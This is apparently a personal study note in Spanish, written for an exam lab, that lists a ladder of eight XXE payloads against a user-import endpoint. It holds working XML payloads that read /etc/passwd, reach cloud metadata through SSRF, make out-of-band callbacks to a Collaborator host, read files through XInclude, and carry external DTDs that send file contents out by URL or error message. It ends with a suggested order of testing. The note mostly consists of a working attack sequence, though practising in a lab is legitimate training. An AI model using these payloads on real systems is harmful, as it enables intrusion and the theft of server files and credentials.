---
aliases:
  - XXE user_import variantes
  - xxe ladder admincontrols
tags:
  - vuln/xxe
  - exam
  - working
---

# XXE `user_import` — variantes para probar (escalera)

> Endpoint: `POST /admincontrols/user_import` (multipart, `user-import-file`). Base que **ya entra**:
> `<users><user><username>Pandora</username><email>pandora@example.com</email></user></users>`
> Técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

- **Collaborator:** `648smn7yb5und8d7rky0npsoffl696xv.oastify.com`
- **Recordá:** mantené el `csrf` válido y subilo como archivo `user-import-file`. `Poll now` en Collaborator para las OOB.
- **Contexto:** antes el `<!DOCTYPE>` daba error → probable **DTD bloqueado**. Si eso se confirma, las V1–V4/V6–V8 fallan y el ganador es **XInclude (V5)**. Igual probá la escalera para saber DÓNDE corta la defensa.

---

## V1 — In-band: leer archivo ([[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001]])
**Sirve si** la respuesta refleja el `username`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<users>
    <user><username>&xxe;</username><email>pandora@example.com</email></user>
</users>
```
→ Verificación: `/etc/passwd` vuelve dentro del username.

## V2 — In-band → SSRF metadata cloud ([[vulnerabilities/006-xxe/examples/002-xxe-a-ssrf-metadata-cloud|002]])
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<users>
    <user><username>&xxe;</username><email>pandora@example.com</email></user>
</users>
```

## V3 — Blind OOB, entidad general ([[vulnerabilities/006-xxe/examples/005-xxe-ciego-callback-oob|005]] escalón 1)
**Primer disparo si es ciego.** La general DEBE referenciarse en el cuerpo.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY xxe SYSTEM "http://648smn7yb5und8d7rky0npsoffl696xv.oastify.com"> ]>
<users>
    <user><username>&xxe;</username><email>pandora@example.com</email></user>
</users>
```

## V4 — Blind OOB, entidad de parámetro (005 escalón 2)
**Si bloquean `&` (entidades generales).** `%xxe;` dispara al declararse, dentro del DOCTYPE.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY % xxe SYSTEM "http://648smn7yb5und8d7rky0npsoffl696xv.oastify.com"> %xxe; ]>
<users>
    <user><username>Pandora</username><email>pandora@example.com</email></user>
</users>
```

## V5 — XInclude, SIN DOCTYPE ([[vulnerabilities/006-xxe/examples/003-xinclude-sin-controlar-el-xml|003]]) ⭐ (el candidato acá)
**Cuando el `<!DOCTYPE>` está bloqueado.** No usa DTD ni entidades.

**OOB (confirmar el XXE):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<users xmlns:xi="http://www.w3.org/2001/XInclude">
    <user><username><xi:include parse="text" href="http://648smn7yb5und8d7rky0npsoffl696xv.oastify.com/x"/></username><email>pandora@example.com</email></user>
</users>
```

**Leer archivo (si refleja el username):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<users xmlns:xi="http://www.w3.org/2001/XInclude">
    <user><username><xi:include parse="text" href="file:///etc/passwd"/></username><email>pandora@example.com</email></user>
</users>
```
→ Namespace `xmlns:xi` obligatorio · `parse="text"`. Si se queja del namespace en el root, envolvé con `<foo xmlns:xi=...>...</foo>` dentro del campo.

## V6 — Blind: exfiltrar con DTD externo ([[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]])
**Necesita exploit server + DOCTYPE permitido.** Reemplazá `EXPLOIT.exploit-server.net`.

`exploit.dtd`:
```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://648smn7yb5und8d7rky0npsoffl696xv.oastify.com/?x=%file;'>">
%eval;
%exfil;
```
Trigger:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [ <!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit.dtd"> %xxe; ]>
<users>
    <user><username>Pandora</username><email>pandora@example.com</email></user>
</users>
```
→ `/etc/hostname` (1 línea) va limpio; multilínea rompe la URL → V7.

## V7 — Blind: error-based con DTD externo ([[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007]])
**Sin canal OOB o archivo multilínea.** El contenido vuelve en el mensaje de error.

`exploit.dtd`:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Trigger: mismo stub que V6.

## V8 — Reutilizar un DTD local ([[vulnerabilities/006-xxe/examples/008-xxe-ciego-reutilizar-dtd-local|008]])
**Si no permite DTD externo pero sí DOCTYPE.** Redefinís una entidad de un `.dtd` que ya existe en el server (ej. `/usr/share/yelp/dtd/docbookx.dtd`). Ver la nota para el gadget exacto.

---

## Orden sugerido de prueba
1. **V3** (blind general) y **V4** (blind param) → si alguno pega en Collaborator, XXE clásico confirmado.
2. Si el `<!DOCTYPE>` sigue dando error → **V5 XInclude** (OOB primero, después file-read).
3. Con XXE confirmado y para sacar datos: **V6** (OOB exfil) o **V7** (error-based) si tenés DOCTYPE + exploit server.
